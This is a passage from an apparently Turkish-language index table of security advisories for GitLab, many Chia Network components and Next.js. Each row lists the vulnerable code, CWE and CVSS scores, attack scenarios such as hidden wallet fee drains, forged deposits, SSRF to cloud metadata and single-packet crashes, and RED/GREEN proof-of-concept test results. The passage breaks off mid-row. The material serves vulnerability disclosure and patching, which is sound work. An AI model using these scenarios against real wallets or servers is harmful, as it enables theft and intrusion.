| **19** | [`19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md`](advisories/tr/19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md)<br/>Üst Akış Duplicate: `CVE-2026-40295`<br/>*(Yalnızca GitHub — MITRE'ye Gönderilmedi)* | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`lib/gitlab/devise_failure.rb:4-18`<br/>`lib/gitlab/auth/session_expire_from_init_enforcer.rb:44-62`<br/>`app/controllers/oauth/authorizations_controller.rb:316-330` | `CWE-601 / CWE-345`<br/>**5.4 Medium (Upstream CVE-2026-40295 Duplicate)**<br/>`AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` | **[ÜST AKIŞ DUPLICATE: `CVE-2026-40295` — Yalnızca GitHub'da Yayımlandı, MITRE'ye Gönderilmedi]**<br/>**Kodda Oluşumu:** `Gitlab::DeviseFailure`, `Devise 5.0.3` (`CVE-2026-40295`) içindeki `redirect_url` metodunu miras alarak `GET` dışı `:timeout` hatalarında harici `Referer` başlığına yönlendirme yapar; `CAND-03` ise çalışma zamanında `Doorkeeper 5.9.3` tarafından engellenir.<br/>**Senaryo A/B/C:** `lib/gitlab/devise_failure.rb` içinde `extract_path_from_location(request.referrer)` ürün yaması ve PKCE savunma derinliği yaması. | `DUPLICATE OF CVE-2026-40295` *(Not submitted to MITRE)*<br/>`RED`: `external_referer_redirect: true`<br/>`GREEN`: `path_extracted_only: true` |
| **20** | [`20-CHIA-WLC-01-LIGHT-WALLET-FOLIAGE-BLOCK-SWAP-FAKE-DEPOSIT.md`](advisories/tr/20-CHIA-WLC-01-LIGHT-WALLET-FOLIAGE-BLOCK-SWAP-FAKE-DEPOSIT.md)<br/>`CHIA-WLC-01`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/wallet/wallet_node.py:926-995` (`_add_block_from_header`) | `CWE-345 / CWE-347`<br/>**9.1 Critical**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H` | **Kodda Oluşumu:** `WalletNode._add_block_from_header` (`wallet_node.py:926-995`), `foliage_transaction_block.get_hash() == header_block.foliage.foliage_transaction_block_hash` kontrolünü yapmadan işlem blokunu kabul eder.<br/>**Senaryo A (0 XCH Sermayeli Sahte Yatırım):** Cebinde `0 XCH` olan saldırgan gerçek başlık altına sahte işlem bloku takarak satıcı cüzdanında `+0.5 XCH` (`500,000,000,000 mojo`) onaylı bakiye gösterir ve gerçek USDT/BTC çeker.<br/>**Senaryo B (Kalıcı SQLite Zehirlemesi):** Sahte coin cüzdan yeniden başlatıldığında da kalır; harcanmak istendiğinde `UNKNOWN_UNSPENT` verir.<br/>**Senaryo C (`CONS-SP-01` + `WLC-01`):** FullNode senkron kilidi sonrası hafif cüzdana sahte yatırım enjeksiyonu. | `RED`: `fake_merchant_deposit_increase_mojo: 500000000000, spend_err: UNKNOWN_UNSPENT`<br/>`GREEN`: `rejected_forged_foliage_tx_block: true, fake_increase: 0`<br/>`pytest -k test_wlc01` |
| **21** | [`21-CHIA-WLC-02-CLAWBACK-PHANTOM-SPENT-POISONING-LOCKOUT.md`](advisories/tr/21-CHIA-WLC-02-CLAWBACK-PHANTOM-SPENT-POISONING-LOCKOUT.md)<br/>`CHIA-WLC-02`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/wallet/wallet_node.py:725-777`<br/>`chia/wallet/wallet_state_manager.py:1735-1778` | `CWE-345 / CWE-400`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H` | **Kodda Oluşumu:** `wallet_node.py:725-777` ve `wallet_state_manager.py:1735-1778`, kanıtsız `RespondRemovals(proofs=None)` / `spent_height` bildirimini Merkle kanıtı olmadan SQLite `WalletCoinStore`'a yazar.<br/>**Senaryo A (Clawback İptal Kilidi):** Kurban `0.5 XCH` Clawback işlemini iptal edemez (`tx_count: 0`); süre dolunca saldırgan zincir üstünde parayı çeker (`33361e6b...`).<br/>**Senaryo B (`WLC-02` + `VR-01` Birleşik Zincir):** Tek zaman çizelgesinde (`t0..t4`) hem cüzdan iptalini hem `chia-vault-recover` CLI aracını kilitler.<br/>**Senaryo C (UTXO Dondurma):** Cüzdan yeniden başlatılsa bile coin harcanmış görünür. | `RED`: `t1_cold_reloaded_sqlite_spent: true, t2_sender_cancel_tx_count: 0, t4_recipient_claim_succeeded: true`<br/>`GREEN`: `t1_spent: false, t2_sender_cancel_tx_count: 1`<br/>`pytest -k test_wlc02` |
| **22** | [`22-CHIA-GUI-WC-01-WALLETCONNECT-MODAL-OVERWRITE-TOCTOU.md`](advisories/tr/22-CHIA-GUI-WC-01-WALLETCONNECT-MODAL-OVERWRITE-TOCTOU.md)<br/>`CHIA-GUI-WC-01`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain-gui** (`<= 2.6.1-rc2.dev60`)<br/>`packages/gui/src/components/walletConnect/WalletConnectContext.tsx:314-441`<br/>`constants/WalletConnectCommands.ts` | `CWE-367 / CWE-285`<br/>**8.8 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` | **Kodda Oluşumu:** `WalletConnectContext.tsx:314-441` bağlantıda 29 komutun tamamını açar, FIFO onay kilidi kullanmaz ve `sendCommand` içinde `(requestId, fingerprint, network, pairing)` doğrulaması yapmaz.<br/>**Senaryo A (Onay Penceresi Ezme):** 'Sadece adresine bakacağım' (`getCurrentAddress`) penceresi ezilerek arka planda `chia_sendTransaction` (`SpendBundle d2ce2264...`) çalıştırılır.<br/>**Senaryo B (Parmak İzi TOCTOU):** Boş cüzdanda verilen onay ana cüzdanda (`999999`) çalışır.<br/>**Senaryo C (Bağlantı Kesme Sonrası Yürütme):** Eşleşme silinse bile bekleyen işlem çalışır. | `RED`: `modal_overwritten: true, unauthorized_spend_bundle_sha256: d2ce22645a9a23b1...`<br/>`GREEN`: `6/6 distinct WSS packets blocked`<br/>`pytest -k gui_wc01` |
| **23** | [`23-CHIA-DL-01-DATALAYER-VERIFY-PROOF-NON-SINGLETON-FORGERY-CAT-MINT.md`](advisories/tr/23-CHIA-DL-01-DATALAYER-VERIFY-PROOF-NON-SINGLETON-FORGERY-CAT-MINT.md)<br/>`CHIA-DL-01`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/rpc/wallet_rpc_api.py:4066-4120` (`dl_verify_proof`)<br/>`chia/data_layer/data_layer_util.py` | `CWE-347 / CWE-345`<br/>**9.1 Critical**<br/>`AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N` | **Kodda Oluşumu:** `WalletRpcApi.dl_verify_proof` (`wallet_rpc_api.py:4066-4120`), kanıttaki coin'in `match_dl_singleton` ve `launcher_id == store_id` soy kütüğüne ait olduğunu doğrulamaz.<br/>**Senaryo A (`100.000 CAT` Zincir Üstü Basım):** `1 mojo`'luk sahte coin (`86ec0dd7...`) kurumun `store_id` (`806a6c73...`) kanıtını taklit eder ve zincirde `100.000 CAT` (`dc3f0bba...`) basılır.<br/>**Senaryo B (Doğrudan RPC Kanıtı):** Yan yana testte gerçek ve sahte kanıt `RED` modda aynı `verified: true` sonucunu alır.<br/>**Senaryo C (Resmi Sicil Sahteciliği):** Herhangi bir `store_id` adına sahte veri kanıtı doğrulatılır. | `RED`: `counterfeit_verified: true, attacker_cat_balance_mojo: 100000000`<br/>`GREEN`: `counterfeit_verified: false, attacker_cat_balance_mojo: 0`<br/>`pytest -k dl01` |
| **24** | [`24-CHIA-CS-01-CLEAR-SIGNING-NON-CANONICAL-CONDITION-OTHER-FEE-DRAIN.md`](advisories/tr/24-CHIA-CS-01-CLEAR-SIGNING-NON-CANONICAL-CONDITION-OTHER-FEE-DRAIN.md)<br/>`CHIA-CS-01 (POC-1 & POC-2)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs`<br/>`crates/chia-sdk-driver/src/clear_signing/tests.rs` | `CWE-451 / CWE-345`<br/>**8.6 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H` | **Kodda Oluşumu:** `clear_signing.rs`, konsensüsta geçerli olan fazladan argümanlı `Condition::Other` koşullarını (`RESERVE_FEE` vb.) hata vermeden yok sayar.<br/>**Senaryo A (`750 XCH` Gizli Ücret Çekimi):** `SpendBundle` `b9b614d0...` imza ekranında `reserved_fee: 0` gösterirken kasadan `750 XCH` (`750,000,000,000,000 mojo`) çeker.<br/>**Senaryo B (NFT Durum Manipülasyonu):** `SpendBundle` `17d2796f...` ile NFT durumu ekranda görünmeden değiştirilir.<br/>**Senaryo C (Savunma Yaması):** `GREEN` modunda standart dışı koşullar reddedilir. | `RED`: `displayed_fee_mojo: 0, consensus_fee_drained_mojo: 750000000000000`<br/>`GREEN`: `rejected_non_canonical_condition: true`<br/>`cargo test clear_signing::tests` |
| **25** | [`25-CHIA-CS-02-CLEAR-SIGNING-NFT-METADATA-UPDATER-HIDDEN-FEE.md`](advisories/tr/25-CHIA-CS-02-CLEAR-SIGNING-NFT-METADATA-UPDATER-HIDDEN-FEE.md)<br/>`CHIA-CS-02 (POC-3)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs` (`NEW_METADATA_INFO` evaluation) | `CWE-451 / CWE-345`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` | **Kodda Oluşumu:** `clear_signing.rs`, NFT `NEW_METADATA_INFO` güncelleyici programının ürettiği ek `RESERVE_FEE` koşullarını hesaba katmaz.<br/>**Senaryo A (`500 XCH` Gizli Çıkış):** `SpendBundle` `b314b6d7...` (`3.300B`) ekranda `0 ücret` gösterirken `500 XCH` çeker.<br/>**Senaryo B (Tuzaklı NFT Güncelleyici):** Özel güncelleyici kasa işleminde gizli çıkışı tetikler.<br/>**Senaryo C (`GREEN` Yaması):** Ek koşul üreten güncelleyicileri reddeder. | `RED`: `displayed_fee_mojo: 0, consensus_fee_drained_mojo: 500000000000000`<br/>`GREEN`: `rejected_impure_metadata_updater: true`<br/>`cargo test clear_signing::tests` |
| **26** | [`26-CHIA-CS-03-CLEAR-SIGNING-OFFER-SET-INTERSECTION-OUTFLOW-OMISSION.md`](advisories/tr/26-CHIA-CS-03-CLEAR-SIGNING-OFFER-SET-INTERSECTION-OUTFLOW-OMISSION.md)<br/>`CHIA-CS-03 (POC-4)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs` (dependent offer leg aggregation) | `CWE-682 / CWE-451`<br/>**8.6 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` | **Kodda Oluşumu:** `clear_signing.rs` bağımlı teklif bacaklarını kesişim (`intersection`) ile birleştirerek ayrık ödeme bacaklarını düşürür.<br/>**Senaryo A (`500 XCH` Gizli Teklif Bacağı):** Kasa (`3c55638a...`) ve settlement (`7c05b725...`) harcamasıyla `500 XCH` ekranda görünmeden çekilir.<br/>**Senaryo B (Hazine Takas Kaybı):** İkinci ödeme bacağı imzalanan özette yer almaz.<br/>**Senaryo C (`GREEN` Yaması):** Tüm bacakların tam birleşimini zorunlu kılar. | `RED`: `omitted_settlement_outflow_mojo: 500000000000000`<br/>`GREEN`: `full_outflow_accounted_or_rejected: true`<br/>`cargo test clear_signing::tests` |
| **27** | [`27-CHIA-CS-04-CLEAR-SIGNING-UNREVEALED-SETTLEMENT-SPEND-BLIND-SPOT.md`](advisories/tr/27-CHIA-CS-04-CLEAR-SIGNING-UNREVEALED-SETTLEMENT-SPEND-BLIND-SPOT.md)<br/>`CHIA-CS-04 (POC-5)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs` (unrevealed settlement output handling) | `CWE-345 / CWE-451`<br/>**8.6 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` | **Kodda Oluşumu:** `clear_signing.rs`, harcaması pakette gösterilmeyen (`unrevealed`) `SETTLEMENT_PAYMENT_HASH` çıktısını geçerli kabul eder.<br/>**Senaryo A (`600 XCH` Gizli Settlement):** Kurban `a9eeda2c...` (`1.303B`) paketini imzalar; saldırgan `e0b876fb...` (`388B`) harcamasını ekleyip `600 XCH` çeker.<br/>**Senaryo B (Donanım Cüzdanı Atlama):** İmza ekranında dış alıcı görünmez.<br/>**Senaryo C (`GREEN` Yaması):** Açılmamış settlement çıktılarını reddeder. | `RED`: `unrevealed_settlement_accepted: true, hidden_outflow_mojo: 600000000000000`<br/>`GREEN`: `rejected_unrevealed_settlement: true`<br/>`cargo test clear_signing::tests` |
| **28** | [`28-CHIA-CS-05-CLEAR-SIGNING-EXTERNAL-DROPCOIN-VAULT-CHANGE-SPOOFING.md`](advisories/tr/28-CHIA-CS-05-CLEAR-SIGNING-EXTERNAL-DROPCOIN-VAULT-CHANGE-SPOOFING.md)<br/>`CHIA-CS-05 (POC-6)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.38.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs`<br/>`crates/chia-sdk-bindings/src/clear_signing.rs:62` (`parse_vault_transaction`) | `CWE-682 / CWE-451`<br/>**9.1 Critical**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H` | **Kodda Oluşumu:** `clear_signing.rs` ve `chia_sdk_bindings::parse_vault_transaction`, kasaya ait olmayan harici `DropCoin` çıktısını kasa para üstü (change) olarak düşer.<br/>**Senaryo A (`1.000 XCH` Kasa Boşaltma):** `SpendBundle` `aa651822...` (`1.477B`) kasadan `1.000 XCH` çekerken FFI özetinde kaybı gizler.<br/>**Senaryo B (Multi-Sig Yanıltma):** Tüm imzacılar aynı sahte para üstü özetini görür.<br/>**Senaryo C (`GREEN` FFI Kanıtı):** `Error::NonStandardInnerSpend` ile reddeder. | `RED`: `ffi_parse_vault_tx_accepted: true, masked_vault_drain_mojo: 1000000000000000`<br/>`GREEN`: `Err(NonStandardInnerSpend)`<br/>`cargo test --test clear_signing_ffi_proof` |
| **29** | [`29-CHIA-CS-06-CLEAR-SIGNING-OFFER-PRE-SPLIT-POST-SIG-SPLICING.md`](advisories/tr/29-CHIA-CS-06-CLEAR-SIGNING-OFFER-PRE-SPLIT-POST-SIG-SPLICING.md)<br/>`CHIA-CS-06 (POC-7)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs` (offer pre-split coin destination binding) | `CWE-347 / CWE-451`<br/>**9.1 Critical**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H` | **Kodda Oluşumu:** `clear_signing.rs`, kasa harcamasına kriptografik anonsla bağlanmamış ön-bölme (`pre-split`) alt harcamalarını kabul eder.<br/>**Senaryo A (`1.000 XCH` İmza Sonrası Yönlendirme):** Kurban `476b8e83...` (`1.994B`) paketini imzalar; saldırgan `5b3a3b21...` (`1.701B`) ile `1.000 XCH`'yi aynı BLS imzası altında çalar.<br/>**Senaryo B (Mempool Değişimi):** İmzasız alt bacak ağda değiştirilir.<br/>**Senaryo C (`GREEN` Yaması):** Kriptografik anons bağlamasını zorunlu tutar. | `RED`: `pre_split_sha256: 476b8e83..., spliced_sha256: 5b3a3b21..., redirected_mojo: 1000000000000000`<br/>`GREEN`: `rejected_unbound_presplit: true`<br/>`cargo test clear_signing::tests` |
| **30** | [`30-CHIA-CS-07-CLEAR-SIGNING-REVERSE-CLAWBACK-SENDER-HIJACK.md`](advisories/tr/30-CHIA-CS-07-CLEAR-SIGNING-REVERSE-CLAWBACK-SENDER-HIJACK.md)<br/>`CHIA-CS-07 (POC-8)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs` (Clawback `sender_puzzle_hash` ownership check) | `CWE-345 / CWE-451`<br/>**8.6 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` | **Kodda Oluşumu:** `clear_signing.rs`, Clawback çıktısındaki `sender_puzzle_hash` alanının imzalayan kasaya ait olduğunu doğrulamaz.<br/>**Senaryo A (`1.000 XCH` Ters-Clawback):** `SpendBundle` `6897c10e...` (`1.218B`) içinde iptal yetkilisi saldırgan yapılır ve `1.000 XCH` anında çekilir.<br/>**Senaryo B (Kendi Adresine Transfer Tuzağı):** Alıcı kurban görünürken iptal hakkı saldırgandadır.<br/>**Senaryo C (`GREEN` Yaması):** `sender_puzzle_hash` sahipliğini zorunlu kılar. | `RED`: `attacker_set_as_clawback_sender: true, hijacked_mojo: 1000000000000000`<br/>`GREEN`: `rejected_foreign_clawback_sender: true`<br/>`cargo test clear_signing::tests` |
| **31** | [`31-CHIA-CS-08-CLEAR-SIGNING-EXTERNAL-CAT-RING-MELT-ISSUANCE-OMISSION.md`](advisories/tr/31-CHIA-CS-08-CLEAR-SIGNING-EXTERNAL-CAT-RING-MELT-ISSUANCE-OMISSION.md)<br/>`CHIA-CS-08 (POC-9)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs` (external CAT ring TAIL melt/issuance accounting) | `CWE-682 / CWE-451`<br/>**8.6 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` | **Kodda Oluşumu:** `clear_signing.rs`, dış CAT halkasındaki `RUN_TAIL` eritme/ihraç deltalarını kasa özetine dahil etmez.<br/>**Senaryo A (`750 XCH` Ölçekli CAT Kaybı):** `SpendBundle` `e48c3171...` (`2.541B`) dış halkadaki eritme ile `750,000,000,000,000` mojo çeker.<br/>**Senaryo B (İtfa Soygunu):** Dış halka üyesi kasanın CAT farkını emer.<br/>**Senaryo C (`GREEN` Yaması):** Tam CAT halkası korunumunu zorunlu tutar. | `RED`: `poc9_spend_bundle_sha256: e48c3171..., omitted_cat_ring_delta_mojo: 750000000000000`<br/>`GREEN`: `rejected_unbalanced_external_cat_ring: true`<br/>`cargo test clear_signing::tests` |
| **32** | [`32-CHIA-VR-01-VAULT-RECOVER-DUST-LAUNCHER-POISONING-LOCKOUT.md`](advisories/tr/32-CHIA-VR-01-VAULT-RECOVER-DUST-LAUNCHER-POISONING-LOCKOUT.md)<br/>`CHIA-VR-01 (POC-10)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-vault-recover** (`<= 1.0.0-rc9`)<br/>`src/locate.rs:148-219` (`find_launcher_id`) | `CWE-345 / CWE-400`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` | **Kodda Oluşumu:** `find_launcher_id` (`src/locate.rs:148-219`), adresteki ilk `SINGLETON_LAUNCHER_HASH` kaydını kurtarma anahtarıyla eşleşip eşleşmediğine bakmadan seçer.<br/>**Senaryo A (1-Mojo İle Kurtarma Kilidi):** Sahte launcher `2de44601...` yüzünden `chia-vault-recover` (`1.0.0-rc9`) `recovery phrase does not match` hatasıyla çöker.<br/>**Senaryo B (`WLC-02` + `VR-01` Zinciri):** Hem arayüzü hem CLI kurtarmayı kilitler.<br/>**Senaryo C (`GREEN` İkilisi):** Gerçek kasa `e53d0c41...` kurtarılır (`45/45` test). | `RED`: `selected_launcher: 2de44601... (decoy), cli_exit_code: 1`<br/>`GREEN`: `selected_launcher: e53d0c41... (victim), cli_exit_code: 0`<br/>`pytest -k poc10` |
| **33** | [`33-CHIA-CONS-SP-01-FULLNODE-SUB-EPOCH-SYNC-LOCKOUT-AND-REORG.md`](advisories/tr/33-CHIA-CONS-SP-01-FULLNODE-SUB-EPOCH-SYNC-LOCKOUT-AND-REORG.md)<br/>`CHIA-CONS-SP-01`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/full_node/full_node.py:2220-2310` (`new_peak` / `sync_from_fork_point`) | `CWE-400 / CWE-345`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H` | **Kodda Oluşumu:** `full_node.py:2220-2310`, `sync_from_fork_point` içinde hatalı sub-epoch/weight-proof gönderen P2P eşinin bağlantısını kesmez.<br/>**Senaryo A (Port `8444` Senkron Kilidi):** 3 düğümlü mTLS testinde dürüst düğüm (`height=5`) varken kurban `peak=None` kalır.<br/>**Senaryo B (`10.000 XCH` Reorg Çifte Harcama):** `Branch A` (`26afe149...`) ile borsaya yatırılan `10.000 XCH`, `Branch B` (`ad2eba4d...`) reorg sonrası `0` olur.<br/>**Senaryo C (`GREEN` Yaması):** Saldırgan eşi düşürür ve `32` onay derinliği uygular. | `RED`: `victim_peak: None, reorg_exchange_loss_mojo: 10000000000000000`<br/>`GREEN`: `victim_synced_height: 5, exchange_loss_mojo: 0`<br/>`pytest -k reorg` |
| **34** | [`34-CHIA-WLT-OFFER-01-TAKE-OFFER-UNBOUNDED-IMPLICIT-COIN-SPEND.md`](advisories/tr/34-CHIA-WLT-OFFER-01-TAKE-OFFER-UNBOUNDED-IMPLICIT-COIN-SPEND.md)<br/>`CHIA-WLT-OFFER-01`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/rpc/wallet_rpc_api.py` (`take_offer`)<br/>`chia/wallet/trade_manager.py` (`respond_to_offer`) | `CWE-863`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` | **Kodda Oluşumu:** `take_offer` / `respond_to_offer`, varlık başına `max_authorized_amount` üst sınırı doğrulamadan cüzdandan coin seçip imzalar.<br/>**Senaryo A (Takas Botu Aşımı):** Dış teklif beklenen tutarın üzerinde coin imzalatır.<br/>**Senaryo B (Gizli Ek Varlık Bacağı):** Token takası sırasında cüzdandan ek XCH çekilir.<br/>**Senaryo C (`GREEN` Yaması):** Varlık başına harcama tavanını zorunlu kılar. | `RED`: `unbounded_implicit_coin_spend_signed: true`<br/>`GREEN`: `exceeded_max_authorized_amount_rejected: true`<br/>`pytest -k wallet` |
| **35** | [`35-CHIA-POS-01-HARVESTER-FARMER-SINGLE-PACKET-RUST-PANIC-DOS.md`](advisories/tr/35-CHIA-POS-01-HARVESTER-FARMER-SINGLE-PACKET-RUST-PANIC-DOS.md)<br/>`CHIA-POS-01`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/farmer/farmer_api.py:85-185` (`FarmerAPI.new_proof_of_space`)<br/>`chiapos` Rust FFI (`size_v2` / `get_quality_string`) | `CWE-248 / CWE-20`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` | **Kodda Oluşumu:** `FarmerAPI.new_proof_of_space` (`farmer_api.py:85-185`), havuz anahtarı XOR ve `check_plot_param` kontrolü yapmadan Rust FFI `size_v2()` / `get_quality_string()` çağırır.<br/>**Scenario A (4/4 Farmer Çöküşü):** Tek bir `445 bayt` paket (`30a0e918...`) `pyo3_runtime.PanicException` fırlatarak 4 Farmer sürecini (`exit_code=1`) çökertir.<br/>**Scenario B (Dilim Sınır Paniği):** Kısa kanıt `range end index 36 out of range` paniği üretir.<br/>**Scenario C (`GREEN` Yaması):** `4/4` Farmer ayakta kalır. | `RED`: `packet_bytes: 445, crashed_farmers: 4/4, PanicException`<br/>`GREEN`: `crashed_farmers: 0/4, alive_farmers: 4`<br/>`pytest -k farmer` |
| **36** | [`36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md`](advisories/tr/36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md)<br/>`CHIA-POS-02..04`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chiapos** (`<= 2.0.11`)<br/>`src/verifier.hpp:48-108` (`Verifier::ValidateProof`)<br/>`src/bits.hpp:184`<br/>`src/prover_disk.hpp:254-322` (`DiskProver`) | `CWE-190 / CWE-787 / CWE-125`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` | **Kodda Oluşumu:** `Verifier::ValidateProof` (`src/verifier.hpp`, `src/bits.hpp:184`) `k=50` (Tablo 4) ve `k>=60` için yığın sınırını aşar; `DiskProver` (`src/prover_disk.hpp`) 64-bit tablo boyutunu 32-bite daraltır.<br/>**Senaryo A (`.plot` Dosyası Heap Taşması):** Zararlı `.plot` dosyası C++ heap taşması tetikler.<br/>**Senaryo B (`k=50` / `k=60` ASan/UBSan Kanıtı):** `chiapos_k_probe` ikilisinde `src/bits.hpp:184` sınır aşımı (`exit_code=1`).<br/>**Senaryo C (`GREEN` Yaması):** Sınır kontrolüyle `exit_code=0` döner. | `RED`: `k50_table4_asan_exit: 1, k60_asan_exit: 1 (src/bits.hpp:184 OOB)`<br/>`GREEN`: `exit_code: 0, rejected_cleanly: true`<br/>`pytest -k chiapos` |
| **37** | [`37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md`](advisories/tr/37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md)<br/>`CHIA-VDF-02`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chiavdf** (`<= 1.1.11`)<br/>`src/verifier.cpp` (`CheckProofOfTimeNWesolowski`)<br/>`src/prover_slow.h` | `CWE-125 / CWE-416`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` | **Kodda Oluşumu:** `CheckProofOfTimeNWesolowski` (`src/verifier.cpp`), `proof_blob_len` ve `num_iterations > 0` kontrolü yapmadan segment okur.<br/>**Senaryo A (Doğrulayıcı OOB Çöküşü):** Kısa VDF kanıtı C++ sınır dışı okuma hatası üretir.<br/>**Senaryo B (Teardown UAF):** `prover_slow.h` içinde serbest bırakılmış belleğe erişilir.<br/>**Senaryo C (`GREEN` Yaması):** Bozuk VDF kanıtını `false` ile güvenle reddeder. | `RED`: `asan_oob_or_segv: true, exit_code: 1`<br/>`GREEN`: `asan_oob_or_segv: false, verified: false`<br/>`chiavdf ASan harness` |
| **38** | [`38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md`](advisories/tr/38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md)<br/>`CHIA-DL-02`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/data_layer/download_data.py`<br/>`chia/data_layer/data_layer.py` | `CWE-918`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` | **Kodda Oluşumu:** `download_data.py`, DataLayer ayna URL'lerini indirirken `30x` yönlendirme hedeflerini `127.0.0.1` / özel IP aralıklarına karşı doğrulamaz.<br/>**Senaryo A (İç Ağ ve Metadata SSRF):** `302` yönlendirmesiyle abone sunucunun `127.0.0.1` / `169.254.169.254` servislerine erişilir.<br/>**Senaryo B (Kopya Düğümler Üzerinden Tarama):** Abone düğümler iç ağ hedeflerine istek gönderir.<br/>**Senaryo C (`GREEN` Yaması):** Özel/loopback IP yönlendirmelerini engeller. | `RED`: `redirect_to_loopback_followed: true, internal_hit_count: 1`<br/>`GREEN`: `redirect_to_loopback_followed: false, internal_hit_count: 0`<br/>`pytest -k dl02` |
| **39** | [`39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md`](advisories/tr/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md)<br/>`VERCEL-NEXT-15`<br/>MITRE CNA-LR & HackerOne #4152250 (+2 Follow-Up Comments Mounted) | **vercel/next.js** (`next <= 16.4.3`)<br/>`packages/next/src/server/app-render/action-handler.ts:363-411, 962-1166`<br/>`packages/next/src/client/components/router-reducer/reducers/server-action-reducer.ts:154-201` | `CWE-200 / CWE-918 / CWE-345`<br/>**8.2 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N` | **Kodda Oluşumu:** `createRedirectRenderResult()` (`action-handler.js:278-303`) iç `fetch()` çağrısında `redirect: 'manual'` kullanmaz; dış `302` yönlendirmelerini `x-next-revalidate-tag-token` (`previewModeId`) ile takip eder ve dış RSC Flight yanıtını aynı kökenli `x-action-redirect` altında tarayıcıya aktarır (`"b"` alanı bırakıldığında `server-action-reducer.js:161` Build ID kontrolü atlanır -> `UXSS`).<br/>**Senaryo A (SSO/OIDC `previewModeId` Sızıntısı):** Çok kiracılı SSO girişinde `previewModeId` dış IdP'ye sızar.<br/>**Senaryo B (Küresel ISR Önbellek Sıfırlama):** Çalınan anahtar `x-prerender-revalidate` ile önbelleği siler.<br/>**Senaryo C (Aynı Kökenli RSC Flight UXSS):** Dış `302` yanıtı sahte Virtual DOM ve CORS başlıklarını `victim-app.com`'a enjekte eder. | `RED`: `leaked_previewModeId: f5dbbd8f6a6a51a6aa8ff1443f7090dd, client_build_id_check_bypassed: true, 